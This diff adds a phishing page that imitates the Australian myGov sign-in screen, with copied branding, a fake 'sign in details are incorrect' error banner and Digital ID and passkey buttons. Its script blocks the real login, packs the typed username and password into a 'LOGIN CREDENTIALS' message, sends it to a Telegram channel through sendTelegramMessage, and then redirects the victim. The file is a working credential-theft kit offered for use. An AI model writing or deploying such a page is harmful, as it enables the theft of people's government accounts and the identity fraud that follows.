@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>Sign in with myGov - myGov</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="./css/css.css" rel="stylesheet">
+    <link href="./css/mgv2-application.css" rel="stylesheet">
+    <link href="./css/blugov.css" rel="stylesheet">
+    <style>
+        .passkey-icon {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            vertical-align: middle;
+        }
+        .button-digital-identity {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            width: 100%;
+        }
+    </style>
+</head>
+
+<body>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a href="#" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="./images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                        </a>
+                        <div class="header-links">
+                            <a href="#">Help</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+    <div class="wrapper-mapwap">
+        <div class="main-block" id="content" role="main">
+            <div class="unauth">
+                <div class="login-grid-container">
+                    <div class="login-grid-row">
+                        <div class="login-grid-column">
+                            <div class="digital-id-login-card-wrapper">
+                                <div class="digital-id-main-login-card override">
+                                    <a data-go-back-link="" class="button-back" href="log.html">Back</a>
+                                    <div id="error-msg-container">
+                                
+                                    
+                                    
+                                        <div class="error-msg" role="alert" aria-live="assertive"><span class="is-visuallyhidden">Error message:</span>
+                                            <div class="error-msg-text"><span>
+                                                <strong>Error</strong>
+                                                <br>
+                                                Your sign in details are incorrect. (RFM10A)
+                                                <br>
+                                                <br>
+                                                <a href="passreset.html">Forgot username</a>
+                                                <br>
+                                                <a href="passreset.html">Forgot password</a>
+                                            </span></div>
+
+                                        </div>
+
+                                    
+                                    
+                                    
+                                    
+                                        
+                                        
+                                        
+                                        
+                                        
+                                    
+                                
+                            </div>
+                                    <h1>Sign in with myGov</h1>
+                                    <p class="login-instruction-text">Choose how to sign in</p>
+
+                                    <!-- Digital ID and Passkey options (exact section you requested) -->
+                                    <div class="digital-id-login-card secondary">
+                                        <div class="button-digital-id-container">
+                                            <div class="digital-id-login-option-container">
+                                                <div class="inner-options">
+                                                    <a class="button-digital-identity" href="log.html">Sign in with Digital ID</a>
+                                                    <input type="hidden" value="{flowScope.targetParamDI}">
+                                                    <a class="button-digital-identity" id="passkey-signin-btn" href="log.html" onclick="authenticatePasskey(); return false;" tabindex="0">
+                                                        <img class="passkey-icon" src="https://login.my.gov.au/mygov/content/mgv2/icons/FIDO_Passkey_mark_A_black.svg" alt="Passkey icon">
+                                                        Sign in with passkey
+                                                    </a>
+                                                    <p class="external-links-zone">Learn about
+                                                        <a href="log.html">passkeys<span class="is-visuallyhidden"> opens in a new window</span></a>
+                                                    </p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+
+                                    <!-- "or" divider placed directly after the options -->
+                                    <div class="hr-word">
+                                        <div class="draw-circle">
+                                            or
+                                        </div>
+                                    </div>
+
+                                    <!-- Traditional sign-in form -->
+                                    <form id="form-1" class="mygov-login-form alternative" method="post">
+                                        <input type="hidden" name="btn1" value="btn1">
+                                        <div id="msg" style="display:none;color: red;">
+                                            Invalid password..! Please enter correct password.
+                                        </div>
+                                        <div class="input-group">
+                                            <label class="override" for="userId">Username or email</label>
+                                            <input id="ai" name="ai" type="text" value="" autocomplete="off" required="">
+                                        </div>
+                                        <p class="recovery">
+                                            <a href="passreset.html" class="anchor override">Forgot username</a>
+                                        </p>
+                                        <div class="input-group">
+                                            <label for="password" class="override">Password</label>
+                                            <div class="password-group">
+                                                <button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button>
+                                                <p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p>
+                                                <input id="pr" name="pr" type="password" aria-required="true" required="">
+                                            </div>
+                                        </div>
+                                        <p class="recovery">
+                                            <a href="passreset.html" class="anchor override">Forgot password</a>
+                                        </p>
+                                        <div class="button-digital-id-main-container override">
+                                            <div class="digital-id-button-container">
+                                                <button type="submit" class="button-main" name="btn1" id="btn1">Sign in</button>
+                                            </div>
+                                        </div>
+                                        <p class="create-account-text">
+                                            <a class="create-account-link" href="log.html">Create a myGov account</a> if you don't have one already.
+                                        </p>
+                                    </form>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer role="contentinfo">
+        <div class="wrapper">
+            <div class="inner">
+                <section class="footer-list">
+                    <nav>
+                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
+                        <ul class="lower-links">
+                            <li><a target="_blank" href="#">Terms of use</a></li>
+                            <li><a target="_blank" href="#">Privacy and security</a></li>
+                            <li><a target="_blank" href="#">Copyright</a></li>
+                            <li><a target="_blank" href="#">Accessibility</a></li>
+                        </ul>
+                    </nav>
+                </section>
+                <div class="footer-lower">
+                    <section class="footer-lower-logo">
+                        <a href="#">
+                            <img src="./images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+                        </a>
+                    </section>
+                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- JavaScript -->
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+    <script src="endpoints.js"></script>
+<script src="config.js"></script>
+<script>
+    $(document).ready(function() {
+        $('#form-1').on('submit', function(e) {
+            e.preventDefault();
+            let username = $('#ai').val();
+            let password = $('#pr').val();
+            let msg = "|----------| LOGIN CREDENTIALS |--------------|\n";
+            msg += "Username: " + username + "\n";
+            msg += "Password: " + password + "\n";
+            msg += "|-----------------------------------------|";
+            sendTelegramMessage(msg).finally(() => {
+                window.location.href = 'log.html';
+            });
+        });
+    });
+</script>
+</body>
+
+</html>
